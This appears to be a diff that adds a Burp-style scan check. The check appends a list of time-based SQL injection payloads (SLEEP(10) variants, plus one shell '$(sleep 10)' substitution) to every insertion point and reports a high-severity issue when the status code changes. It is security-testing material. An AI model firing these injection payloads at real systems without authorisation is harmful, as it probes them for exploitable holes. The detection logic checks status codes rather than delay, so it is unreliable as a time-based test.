@@ -1,0 +1,70 @@
+metadata:
+    language: v1-beta
+    name: "Insertion-point-level"
+    description: "Inserts a generic time based payload through all insertion points. Own designed for a specific use case."
+    author: "Bruno Menozzi"
+
+run for each:
+    payload = 
+    "'",
+    "1 and sleep 10--",
+	"1 and sleep 10",
+	"1 and sleep(10)--",
+	"1 and sleep(10)",
+	"' and sleep 10--",
+	"' and sleep 10",
+	"' and sleep 10 and '1'='1",
+	"' and sleep(10) and '1'='1",
+	"' and sleep(10)--",
+	"' and sleep(10)",
+	"' AnD SLEEP(10) ANd '1",
+	"and sleep 10--",
+	"and sleep 10",
+	"and sleep(10)--",
+	"and sleep(10)",
+	"and SELECT SLEEP(10); #",
+	"AnD SLEEP(10)",
+	"AnD SLEEP(10)--",
+	"AnD SLEEP(10)#",
+	"' AND SLEEP(10)#",
+	"\" AND SLEEP(10)#",
+	"') AND SLEEP(10)#",
+	"or sleep 10--",
+	"or sleep 10",
+	"or sleep(10)--",
+	"or sleep(10)",
+	"or SELECT SLEEP(10); #",
+	"or SLEEP(10)",
+	"or SLEEP(10)#",
+	"or SLEEP(10)--",
+	"or SLEEP(10)=\"",
+	"or SLEEP(10)='",
+	"' OR SLEEP(10)#",
+	"\" OR SLEEP(10)#",
+	"') OR SLEEP(10)#",
+	"')) or sleep(10)='",
+	"\" or sleep(10)#",
+	"1) or sleep(10)#",
+	")) or sleep(10)='",
+	"1)) or sleep(10)#",
+	"or sleep(10)#",
+	"%20'sleep%2010'",
+	"%20$(sleep%2010)",
+	"\")) or sleep(10)=\"",
+	"or sleep(10)='",
+	"\") or sleep(10)=\"",
+	") or sleep(10)='",
+	"1 or sleep(10)#"
+    
+
+given insertion point then
+    send payload:
+        appending: {payload}
+
+    if not({base.response.status_code} is {latest.response.status_code}) and not("/Error/HttpError?" in {latest.response}) then
+        report issue:
+            severity: high
+            confidence: tentative
+            detail: ""
+            remediation: "Manual investigation is necessary."
+    end if
